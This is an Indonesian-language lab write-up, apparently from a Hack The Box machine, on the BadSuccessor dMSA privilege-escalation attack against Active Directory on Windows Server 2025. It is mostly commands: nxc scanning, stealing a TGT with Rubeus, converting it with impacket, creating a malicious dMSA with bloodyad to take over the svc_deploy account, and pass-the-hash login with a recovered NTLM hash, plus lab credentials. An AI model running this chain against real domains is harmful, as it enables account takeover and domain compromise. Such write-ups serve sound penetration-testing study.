# BadSuccessor
adalah exploitasi dMSA (delegated Managed Service Account)
Syarat
1. Server 2025 Build 26100
   ![](Attachments/Pasted%20image%2020260630104010.png)
2. Akun punya OU control
   ![](Attachments/Pasted%20image%2020260630104602.png)
3. Punya akun yang bisa di kontrol

## Scanning
hanya deteksi saja, tanpa exploitasi
```shell
nxc ldap checkpoint.htb -u 'mark.davies' -p 'Checkpoint2024!' -M badsuccessor
```
![](Attachments/Pasted%20image%2020260630141850.png)
## Exploitasi
### 1. Ambil tgt akun
```powershell
.\Rubeus.exe tgtdeleg /nowrap
```
![](Attachments/Pasted%20image%2020260630142927.png)
### 2. Convert ke ccache format
![](Attachments/Pasted%20image%2020260630143834.png)
```shell
echo 'doIF..' | base64 -d > ryan.kirbi 
impacket-ticketConverter ryan.kirbi ryan.kirbi.ccache
```
### 3. Exploitasi 
```shell
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.kirbi.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```
![](Attachments/Pasted%20image%2020260630144806.png)

### 4. Konfirmasi credential
```shell
nxc smb 10.129.13.230 -u 'svc_deploy' -H 'e16081eb077aca74bdbf8af12af43ac9' 

nxc winrm 10.129.13.230 -u 'svc_deploy' -H 'e16081eb077aca74bdbf8af12af43ac9' 
```
![](Attachments/Pasted%20image%2020260630152826.png)

### 5. Login sebagai svc_deploy
![](Attachments/Pasted%20image%2020260630160131.png)
